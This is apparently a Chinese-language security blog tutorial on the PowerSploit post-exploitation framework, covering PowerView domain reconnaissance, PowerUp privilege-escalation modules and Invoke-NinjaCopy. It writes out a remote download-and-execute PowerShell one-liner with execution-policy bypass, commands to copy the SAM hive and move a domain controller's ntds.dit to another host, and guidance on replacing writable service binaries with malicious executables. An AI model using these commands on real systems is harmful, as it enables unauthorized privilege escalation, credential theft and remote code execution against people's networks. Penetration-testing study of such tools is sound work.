**目录**

[PowerSploit](#t0 "PowerSploit")

[PowerSploit的用法](#t1 "PowerSploit的用法")

[PowerView.ps1脚本的使用](#t2 "PowerView.ps1脚本的使用")

[PowerUp.ps1脚本的使用](#t3 "PowerUp.ps1脚本的使用")

[Invoke-Allchecks模块](#t4 "Invoke-Allchecks模块")

[Invoke-NinjaCopy.ps1脚本的使用](#t5 "Invoke-NinjaCopy.ps1脚本的使用")

![](https://img-blog.csdnimg.cn/20191208154959158.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)
===================================================================================================================================================================================================

PowerSploit
===========

PowerSploit是一款基于[PowerShell](https://so.csdn.net/so/search?q=PowerShell&spm=1001.2101.3001.7020)的后渗透框架软件，包含了很多PowerShell的攻击脚本，它们主要用于渗透中的信息侦测，权限提升、权限维持等。PowerSploit项目地址：[GitHub - PowerShellMafia/PowerSploit: PowerSploit - A PowerShell Post-Exploitation Framework](https://github.com/PowerShellMafia/PowerSploit "GitHub - PowerShellMafia/PowerSploit: PowerSploit - A PowerShell Post-Exploitation Framework")

![](https://img-blog.csdnimg.cn/20191116222626904.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

*   ActivirusBypass：发现杀毒软件的查杀特征
*   CodeExecution：在目标主机上执行代码
*   Exfiltration：目标主机上的信息搜集工具
*   Mayhem：蓝屏等破坏性的脚本
*   Persistence：后门脚本
*   Privsec：提权等脚本
*   Recon：以目标主机为跳板进行内网信息侦查
*   ScriptModification：在目标主机上创建或修改脚本

本文主要讲的是PowerSploit用于搜索域信息的模块，其他模块用法一致。

PowerSploit的用法
==============

首先，我们想用里面哪个脚本，就先下载该脚本，然后导入该脚本，执行其中的模块。我们以PowerView.ps1脚本为例，该脚本主要用于搜集域信息。

我们先下载PowerView.ps1脚本到本地，然后在当前目录下打开cmd，执行以下命令执行PowerView.ps1脚本中的Get-NetDomain模块，如果要执行该脚本的其他模块，亦是如此

```
powershell -exec bypass Import-Module .\powerview.ps1;Get-NetDomain
```


![](https://img-blog.csdnimg.cn/20191118174035554.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

如果需要远程加载模块的话，我们先将PowerView.ps1放到我们的http服务目录下，然后执行以下命令

```
powershell -exec bypass -c IEX (New-Object System.Net.Webclient).DownloadString('http://xx.xx.xx.xx/powerview.ps1');import-module .\powerview.ps1;Get-NetDomain
```


![](https://img-blog.csdnimg.cn/20191118175702723.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

PowerView.ps1脚本的使用
------------------

PowerView.ps1脚本位于PowerSploit的Recon目录下，该模块主要用于域内信息的收集。

![](https://img-blog.csdnimg.cn/20191118175841525.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

该脚本有以下一些模块

```
Get-NetDomain               #查看域名称      
Get-NetDomainController     #获取域控的信息      
Get-NetForest               #查看域内详细的信息      
Get-Netuser                 #获取域内所有用户的详细信息      
Get-NetUser | select name   #获得域内所有用户名      
Get-NetComputer             #获得域内所有主机名      
Get-NetComputer *admin*     #获得域内主机名中带有admin的      
Get-NetGroup		    #获取域内所有组名      
Get-NetGroup *admin*        #获得域内组中带有admin的      1
Get-NetGroup -UserName test #查询test用户在哪些组中       1
Get-UserEvent		    #获取指定用户日志信息      1
Get-Netshare                #获取本机的网络共享      1
Get-NetProcess              #获取本机进程的详细信息      1
Get-NetOU            	    #获取域内OU信息      1
Get-NetFileServer	    #根据SPN获取当前域使用的文件服务器      1
Get-NetSession 		    #获取在指定服务器存在的Session信息      1
Get-NetRDPSESSION           #获取本机的RDP连接session信息      1
Get-NetGPO 		    #获取域内所有组策略对象      2
Get-ADOBJECT                #获取活动目录的信息      2
Get-DomainPolicy 	    #获取域默认策略       2
Invoke-UserHunter           #查询指定用户登录过的机器      2
Invoke-EnumerateLocalAdmin  #枚举出本地的管理员信息      2
Invoke-ProcessHunter        #判断当前机器哪些进程有管理员权限      2
Invoke-UserEventHunter      #根据用户日志获取某域用户登陆过哪些域机器
```


![](https://img-blog.csdnimg.cn/20191118180329703.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

PowerUp.ps1脚本的使用
----------------

PowerUp.ps1脚本是 Privsec 目录下的一个脚本，功能非常强大。拥有很多用来寻找目标主机Windows服务配置错误来进行提权的模块。当我们无法通过 windows 内核漏洞进行提权的话，这个时候我们就可以利用该脚本来寻找目标主机上Windows服务配置错误来进行提权，或者利用常见的系统服务，通过其继承的系统权限来完成提权。

![](https://img-blog.csdnimg.cn/2019111822315246.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

我们来看下该脚本下模块的功能：

**Service Enumeration(服务枚举)**

```
Get-ServiceUnquoted             该模块返回包含空格但是没有引号的服务路径的服务      
Get-ModifiableServiceFile       该模块返回当前用户可以修改服务的二进制文件或修改其配置文件的服务      
Get-ModifiableService           该模块返回当前用户能修改的服务      
Get-ServiceDetail               该模块用于返回某服务的信息，用法: Get-ServiceDetail -servicename  服务名
```


**Service Abuse(服务滥用)** 

```
Invoke-ServiceAbuse          该模块通过修改服务来添加用户到指定组，并可以通过设置 -cmd 参数触发添加用户的自定义命令      
Write-ServiceBinary          该模块通过写入一个修补的C#服务二进制文件，它可以添加本地管理程序或执行自定义命令，Write-ServiceBinary与Install-ServiceBinary不同之处自安于，前者生成可执行文件，后者直接安装服务        
Install-ServiceBinary        该模块通过Write-ServiceBinary写一个C#的服务用来添加用户，      
Restore-ServiceBinary        该模块用于恢复服务的可执行文件到原始目录，使用：Restore-ServiceBinary -servicename 服务名
```


**DLL Hijacking(DLL注入)** 

```
Find-ProcessDLLHijack       该模块查找当前正在运行的进程潜在的dll劫持机会。      
Find-PathDLLHijack          该模块用于检查当前 %path% 的哪些目录是用户可以写入的      
Write-HijackDll             该模块可写入可劫持的dll
```


**Registry Checks(注册审核)**

```
Get-RegistryAlwaysInstallElevated     该模块用于检查AlwaysInstallElevated注册表项是否被设置，如果已被设置，则意味着SAM文件是以System权限运行的      
Get-RegistryAutoLogon                 该模块用于检测Winlogin注册表的AutoAdminLogon项是否被设置，可用于查询默认的用户名和密码      
Get-ModifiableRegistryAutoRun         该模块用于检查开机自启的应用程序路径和注册表键值，然后返回当前用户可修改的程序路径，被检查的注册表键值有以下：      
    HKLM\Software\Microsoft\Windows\CurrentVersino\Run      
    HKLM\Software\Microsoft\Windows\CurrentVersino\RunOnce      
    HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run      
    HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce      
    HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunService      
    HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceService      1
    HKLM\Software\Microsoft\Windows\CurrentVersion\RunService      1
    HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnceService
```


**Miscellaneous Checks(杂项审核)** 

```
Get-ModifiableScheduledTaskFile       该模块用于返回当前用户能够修改的计划任务程序的名称和路径       
Get-Webconfig                         该模块用于返回当前服务器上web.config文件中的数据库连接字符串的明文      
Get-ApplicationHost                   该模块利用系统上的applicationHost.config文件恢复加密过的应用池和虚拟目录的密码      
Get-SiteListPassword                  该模块检索任何已找到的McAfee的SiteList.xml文件的明文密码      
Get-CachedGPPPassword                 该模块检查缓存的组策略首选项文件中的密码      
Get-UnattendedInstallFile             该模块用于检查以下路径，查找是否存在这些文件，因为这些文件可能含有部署凭据       
    C:\sysprep\sysprep.xml      
    C:\sysprep\sysprep.inf      
    C:\sysprep.inf      1
    C:\Windows\Panther\Unattended.xml      1
    C:\Windows\Panther\Unattend\Unattended.xml      1
    C:\Windows\Panther\Unattend.xml      1
    C:\Windows\Panther\Unattend\Unattend.xml      1
    C:\Windows\System32\Sysprep\unattend.xml      1
    C:\Windows\System32\Sysprep\Panther\unattend.xml
```


**Other Helpers/Meta-Functions(其他一些模块的帮助)** 

```
Get-ModifiablePath                 该模块标记输入字符串并返回当前用户可以修改的文件      
Get-CurrentUserTokenGroupSid       该模块返回当前用户参与的所有小岛屿发展中国家，无论它们是否已禁用。      
Add-ServiceDacl                    该模块将dacl字段添加到get-service返回的服务对象中      
Set-ServiceBinPath                 该模块通过Win 32 api方法将服务的二进制路径设置为指定的值。      
Test-ServiceDaclPermission         该模块用于检查所有可用的服务，并尝试对这些打开的服务进行修改。如果能修改，则返回该服务对象。使用：Test-ServiceDaclPermission -servicename 服务名      
Write-UserAddMSI                   该模块写入一个MSI安装程序，提示要添加一个用户。      
Invoke-AllChecks                   该模块会自动执行 PowerUp.ps1 下所有的模块来检查目标主机是否存在服务配置漏洞
```


**以下是这些模块提权的原理：** 

*   Get-ServiceUnquoted 模块提权 (该模块利用了Windows的一个逻辑漏洞，即当文件包含空格时，WindowsAPI会解释为两个路径，并将这两个文件同时执行，这个漏洞在有些时候会造成权限的提升)。
*   Test-ServiceDaclPermission 模块提权 (该模块会检查所有可用的服务，并尝试对这些打开的服务进行修改，如果可修改，则存在此漏洞)。Windows系统服务文件在操作系统启动时会加载执行，并且在后台调用可执行文件。比如在每次重启系统时，Java升级程序都会检测出Oracle网站是否有新版Java程序。而类似Java程序之类的系统服务程序，在加载时往往都是运行在系统权限上的。所以如果一个低权限的用户对于此类系统服务调用的可执行文件具有可写的权限，那么就可以将其替换成我们的恶意可执行文件，从而随着系统启动服务器获得系统权限。。 

### Invoke-Allchecks模块

```
powershell -exec bypass -c import-module .\PowerUp.ps1;Invoke-Allchecks -verbose
```


运行该脚本，该脚本会自动检查PowerUp.ps1下所有的模块，并在存在漏洞利用的模块下的AbuseFunction中直接给出利用方法

![](https://img-blog.csdnimg.cn/20191202221541505.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

Invoke-NinjaCopy.ps1脚本的使用
-------------------------

该脚本在Exfiltration目录下，该文件的作用是复制一些系统无法复制的文件，比如sam文件。还可以在域环境中传输文件(前提是执行命令的用户是域用户)

注：该脚本需要管理员权限运行

**复制文件**

```
Import-Module .\Invoke-NinjaCopy.ps1      
Invoke-NinjaCopy -Path C:\Windows\system32\config\sam -Verbose -LocalDestination C:\Users\administrator\Desktop\sam
```


![](https://img-blog.csdnimg.cn/20191209140736572.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

**域环境中传输文件**

```
Copy-Item '\\dc.offensive.local\C$\Users\administrator\Desktop\ntds.dit'-Destination '\\Client1.offensive.local\C$\Users\alice\Desktop\tools\ntds.dit'   #将dc.offensive.local主机上c:\users\administrator\desktop\ntds.dit文件复制到 Client1.offensive.local 主机的C:\users\alice\Desktop\tools\ntds.dit文件
```


![](https://img-blog.csdnimg.cn/20191211234452512.png)

未完待续。。。。。。。。。

  如果想跟我一起讨论的话，就快加入我的知识星球吧。星球里有一千多位同样爱好安全技术的小伙伴一起交流！

![](https://img-blog.csdnimg.cn/1219ed79e9ed449d85d27b732cda5ea6.jpg)

参考书籍：[《Web安全攻防-渗透测试实战指南》](https://item.jd.com/12401707.html "《Web安全攻防-渗透测试实战指南》")

相关文章：[PowerShell使用浅析](https://blog.csdn.net/qq_36119192/article/details/103021617 "PowerShell使用浅析")

                  [PowerView：一个可以帮助你躲避检测的内网信息收集脚本](https://www.freebuf.com/sectool/173366.html "PowerView：一个可以帮助你躲避检测的内网信息收集脚本")